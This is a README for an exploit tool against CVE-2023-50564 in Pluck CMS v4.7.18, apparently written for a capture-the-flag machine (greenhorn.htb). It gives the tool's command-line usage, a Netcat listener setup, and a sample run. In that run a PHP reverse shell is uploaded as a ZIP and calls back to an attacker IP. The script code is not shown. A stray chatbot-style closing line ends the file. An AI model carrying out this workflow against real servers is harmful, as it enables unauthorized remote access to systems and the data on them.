# CVE-2023-50564 - Pluck CMS v4.7.18 Remote Code Execution (RCE) Exploit

## Description

This script exploits a Remote Code Execution (RCE) vulnerability in **Pluck CMS v4.7.18**. The vulnerability allows a malicious user to upload a malicious PHP file to the server and execute it, gaining remote command execution on the target machine.

The script automates the entire process by:
1. Authenticating to the Pluck CMS admin panel using provided credentials.
2. Uploading a ZIP file that contains a malicious reverse shell PHP script.
3. Executing the PHP reverse shell, giving the attacker remote access to the target machine.

**Note:** The script requires a Netcat listener on the attacker's machine to receive the reverse shell.

---

## Prerequisites

Before running the script, ensure the following:
- **Netcat** is installed and a listener is set up to receive the reverse shell.
- You have the correct target **host**, **password**, **IP address**, and **port** for the reverse shell.
- You have access to the Pluck CMS admin panel on the target.

---

## Usage

```bash
./CVE-2023-50564 -h <host> -P <password> -i <IP> -p <port>
```

### Arguments:

- `-h <host>`: The target host (e.g., `greenhorn.htb`).
- `-P <password>`: The password for the Pluck CMS admin panel (e.g., `abcd123`).
- `-i <IP>`: The attacker's IP address to receive the reverse shell.
- `-p <port>`: The port on which the Netcat listener is running to capture the reverse shell.

### Example:

```bash
./CVE-2023-50564 -h greenhorn.htb -P ********* -i 10.10.16.7 -p 9001
```

---

## Steps:

1. **Set up Netcat listener**: On the attacker's machine, start a Netcat listener on the specified port:

   ```bash
   nc -nvlp <port>
   ```

   For example:
   
   ```bash
   nc -nvlp 9001
   ```

2. **Run the script**: Provide the required parameters to the script, including the host, password, IP address, and port.

   ```bash
   ./CVE-2023-50564 -h greenhorn.htb -P ********* -i 10.10.16.7 -p 9001
   ```

3. **Script Execution**: 
   - The script logs in to the Pluck CMS admin panel.
   - It uploads a ZIP file containing a reverse shell PHP script (`love.php`).
   - Once the ZIP file is uploaded, the reverse shell is executed on the target, and a connection is made to your Netcat listener.
   - A clean message will be shown: `"RCE is waiting for you, please go take a look."`, and the script will terminate after tracking the time taken.

4. **Access the Target**: Once the reverse shell is triggered, the connection will appear in your Netcat listener, giving you remote access to the target machine.

---

### POC

![image](https://github.com/user-attachments/assets/39a2d5be-0d82-4acb-9401-5fe2c7b421e3)


## Output Example

```bash
./CVE-2023-50564 -h greenhorn.htb -P ********* -i 10.10.16.7 -p 9001
Netcat listener detected on port 9001.
Downloading reverse shell PHP exploit...
updating: love.php (deflated 60%)
Exploit zipped as loverce.zip and original PHP file removed.
Extracted Cookie: PHPSESSID=somecookievalue
Login successful!
ZIP file uploaded successfully.
RCE is waiting for you, please go take a look.
Script terminated. Total time taken: 70 seconds.
```

---

## Requirements

- **cURL**: To interact with the Pluck CMS and upload files.
- **Netcat**: To listen for the reverse shell.

You can install `curl` and `netcat` using the following commands if they are not installed:

### Debian/Ubuntu:

```bash
sudo apt update
sudo apt install curl netcat
```

### Red Hat/CentOS/Fedora:

```bash
sudo yum install curl nc
```

---

## Disclaimer

This script is intended for educational and authorized penetration testing purposes only. Unauthorized use of this script is illegal and unethical. Always obtain proper authorization before exploiting any vulnerability on a system.

---

## Troubleshooting

1. **504 Gateway Time-out**: The script may encounter this error when attempting to execute the reverse shell, but this does not affect the success of the shell execution. The error is usually due to the target server taking too long to respond to the HTTP request, but the shell should still work.
   
2. **Netcat Listener Issues**: If you do not receive the reverse shell, ensure that your IP address and port are correctly set, and that there are no firewall restrictions preventing the target from connecting back to your machine.

3. **Script Fails to Login**: If the login to the CMS admin panel fails, verify the provided password and ensure that the CMS is accessible on the target machine.

---

Let me know if you'd like any further customization or clarification in the README!
